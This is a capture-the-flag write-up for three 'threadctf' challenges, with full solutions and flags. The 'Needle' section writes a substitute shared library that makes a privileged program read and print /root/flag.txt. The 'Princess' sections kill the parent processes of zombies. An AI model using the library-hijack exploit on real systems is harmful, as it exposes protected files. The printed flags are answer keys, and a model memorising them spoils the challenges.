## Needle

`main` reads `/root/flag.txt` into a `malloc`'d buffer in `retrieve_the_fabric()`
but never prints it. The only thing it prints is `name_pointer` — the return
value of `meeting()` from `libmeeting.so` — via `%s`.

Since `libmeeting.so` is loaded into the same process with the same privileges,
`meeting()` can open `/root/flag.txt` itself and return a pointer to a buffer
holding the flag. `main` then prints the flag thinking it's our "name".

**In container:**
```bash
nano program_with_name.c 
```

```c
#include <stdio.h>

static char flag[256];

void *meeting(void *arg) {
    (void)arg;
    FILE *f = fopen("/root/flag.txt", "r");
    if (f) {
        fgets(flag, sizeof(flag), f);
        fclose(f);
    }
    return flag;
}
```

```bash
gcc -shared -fPIC -o libmeeting.so program_with_name.c -lpthread
./meeting
# Polythread has your concent and name: threadctf{sHoOtinG_Som3_aTomiC_feeT}
```

**Flag:** `threadctf{sHoOtinG_Som3_aTomiC_feeT}`

## Princess

**In container:**
```bash
# Show processes to find zombies (State 'Z') and their parents (PPID)
ps aux | grep princess

# Kill the parent cabins by their PPID (repeat until 50 cabins are destroyed)
kill -9 <PPID>
# Repeat until 50 cabins are destroyed, then read the flag
ls -la
cat flag.txt
# threadctf{wh47_Do_Y0u_mEAn_TheY_aRE_alreaDY_DeAd}
```

**Flag:** `threadctf{wh47_Do_Y0u_mEAn_TheY_aRE_alreaDY_DeAd}`

## Challenge 6 - princess2

Since the shell is unavailable, we have to write a C program to scan `/proc` and terminate the parent process of any zombie `princess` process.

**In container:**

```c
// run.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>

int main(void) {
    for (;;) {
        DIR *d = opendir("/proc");
        struct dirent *e;

        while ((e = readdir(d))) {
            char path[300], comm[256], state;
            int pid, ppid;
            snprintf(path, sizeof path, "/proc/%s/stat", e->d_name);

            FILE *f = fopen(path, "r");
            if (!f) continue;
            if (fscanf(f, "%d (%255[^)]) %c %d", &pid, comm, &state, &ppid) == 4
                && state == 'Z'
                && strstr(comm, "princess")
                && ppid > 1) {
                    kill(ppid, SIGKILL);
                }
            fclose(f);
        }
        closedir(d);
        sleep(1);
    }
}
```

```bash
gcc run.c -o run
./run
```

Wait for:
```
=== The Forest ===
The forest falls silent. 100 cursed cabins lie in ruin, and
the story is finally over. Your reward waits in your home directory.
```

```bash
cat flag.txt
# threadctf{I_H0Pe_You_caN_C_cL3ARlY_NoW}
```

**Flag:** `threadctf{I_H0Pe_You_caN_C_cL3ARlY_NoW}`
